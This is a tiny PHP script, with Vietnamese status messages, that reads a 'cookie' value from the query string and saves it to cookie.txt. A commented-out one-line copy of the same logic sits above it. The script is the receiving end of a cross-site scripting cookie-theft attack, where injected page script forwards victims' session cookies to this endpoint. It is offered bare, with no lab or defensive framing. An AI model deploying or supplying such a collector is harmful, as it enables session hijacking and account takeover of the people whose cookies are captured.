<!-- <?php
file_put_contents('cookie.txt',$_GET['cookie']);
?> -->

<?php
if (isset($_GET['cookie'])) {
    file_put_contents('cookie.txt', $_GET['cookie']);
    echo "Cookie đã được lưu.";
} else {
    echo "Không có dữ liệu cookie được gửi.";
}